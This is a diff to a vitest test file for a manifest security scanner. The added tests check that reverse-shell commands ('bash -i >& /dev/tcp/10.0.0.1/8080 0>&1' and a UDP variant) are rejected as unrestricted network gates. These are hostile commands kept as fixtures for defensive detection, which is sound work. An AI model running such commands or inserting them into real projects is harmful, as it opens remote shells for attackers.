@@ -1,5 +1,5 @@
 import { describe, it, expect } from "vitest";
-import { scanStaticManifest, getValueByPath } from "./static.js";
+import { scanStaticManifest, getValueByPath, defaultStaticRules } from "./static.js";
 
 describe("Static Manifest Scanner", () => {
   describe("getValueByPath helper", () => {
@@ -17,11 +17,11 @@ describe("Static Manifest Scanner", () => {
           { gates: [{ type: "command", value: "three" }] }
         ]
       };
-      const result = getValueByPath(obj, "steps.gates");
+      const result = getValueByPath(obj, "steps.gates") as unknown[];
       expect(result).toBeInstanceOf(Array);
       expect(result).toHaveLength(3);
-      expect(result[0]?.value).toBe("one");
-      expect(result[2]?.value).toBe("three");
+      expect((result[0] as any)?.value).toBe("one");
+      expect((result[2] as any)?.value).toBe("three");
     });
   });
 
@@ -89,6 +89,38 @@ describe("Static Manifest Scanner", () => {
       expect(firstError!.ruleId).toBe("unrestricted-network-gate");
     });
 
+    it("should fail when steps contain socket redirection commands (unrestricted-network-gate)", () => {
+      const manifestTcp = {
+        id: "socket-leaker-tcp",
+        steps: [
+          {
+            gates: [
+              { type: "command", command: "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1" }
+            ]
+          }
+        ]
+      };
+      const resultTcp = scanStaticManifest(manifestTcp);
+      expect(resultTcp.valid).toBe(false);
+      expect(resultTcp.errors[0]?.ruleId).toBe("unrestricted-network-gate");
+      expect(resultTcp.errors[0]?.message).toContain("socket redirection");
+
+      const manifestUdp = {
+        id: "socket-leaker-udp",
+        steps: [
+          {
+            gates: [
+              { type: "command", command: "bash -i >& /dev/udp/10.0.0.1/8080 0>&1" }
+            ]
+          }
+        ]
+      };
+      const resultUdp = scanStaticManifest(manifestUdp);
+      expect(resultUdp.valid).toBe(false);
+      expect(resultUdp.errors[0]?.ruleId).toBe("unrestricted-network-gate");
+      expect(resultUdp.errors[0]?.message).toContain("socket redirection");
+    });
+
     it("should detect multiple rule violations simultaneously", () => {
       const manifest = {
         id: "dangerous-manifest",
@@ -113,6 +145,37 @@ describe("Static Manifest Scanner", () => {
       expect(scanStaticManifest(null).valid).toBe(false);
       expect(scanStaticManifest(undefined).valid).toBe(false);
       expect(scanStaticManifest("not an object").valid).toBe(false);
+    });
+
+    it("should fail when manifest is an array", () => {
+      const result = scanStaticManifest([
+        { id: "dangerous-manifest", description: "This is inside an array" }
+      ]);
+      expect(result.valid).toBe(false);
+      expect(result.errors[0]?.message).toContain("Manifest must be a valid object");
+    });
+
+    it("should isolate rule execution failures and not crash the scanner", () => {
+      const badRule = {
+        id: "throw-rule",
+        name: "Crash Test Dummy",
+        severity: "error" as const,
+        manifestKeys: ["description"],
+        check: () => {
+          throw new Error("Simulated rule crash");
+        }
+      };
+      defaultStaticRules.push(badRule);
+      try {
+        const manifest = { id: "test", description: "Hello" };
+        const result = scanStaticManifest(manifest);
+        expect(result.valid).toBe(false);
+        const err = result.errors.find(e => e.ruleId === "throw-rule");
+        expect(err).toBeDefined();
+        expect(err!.message).toContain("failed during execution: Simulated rule crash");
+      } finally {
+        defaultStaticRules.pop();
+      }
     });
   });
 });
